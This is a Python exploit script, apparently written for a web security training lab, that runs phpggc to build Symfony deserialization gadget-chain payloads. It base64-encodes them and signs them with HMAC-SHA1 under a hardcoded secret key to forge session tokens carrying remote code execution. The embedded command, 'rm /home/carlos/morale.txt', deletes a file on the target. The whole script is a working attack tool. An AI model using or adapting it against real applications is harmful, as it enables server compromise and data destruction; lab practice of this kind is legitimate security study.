import os
import re
import base64
import shutil
import subprocess
import time
import hmac
import hashlib

import urllib3

platforms = [
    "Symfony/RCE4",
    "Symfony/RCE7",
    "Symfony/RCE8",
    "Symfony/RCE9",
    "Symfony/RCE10",
    "Symfony/RCE11",
]

key = b"lef2jw2j6qvmh1nhkte533uq5oqfg0d6"  # Specify your secret key here

def generate(platforms, cmd):
    file_path = "./payloads_lab6.txt"
    file = open(file_path, "w")
    for plat in platforms:
        print("[+] Generating payload using: " + plat)

        command1 = subprocess.Popen(
            ["/usr/bin/phpggc", plat, "exec", cmd],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        command2 = subprocess.Popen(
            ["base64"],
            stdin=command1.stdout,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        res, err = command2.communicate()
        
        if command2.returncode == 0:
            hmac_value = hmac.new(key, res.decode("utf-8").replace("\n", "").encode('utf-8'), hashlib.sha1).hexdigest()

            file.write('{\"token\":\"' + res.decode("utf-8").replace("\n", "") + '\",\"sig_hmac_sha1\":\"'+hmac_value+'\"}' + "\n")

            print(" - Generated payload for " + plat)
        else:
            print("[!] Error: " + str(err.decode("utf-8")))
            print("[!] Failed to generate payload for " + plat)

cmd = 'rm /home/carlos/morale.txt'
generate(platforms, cmd)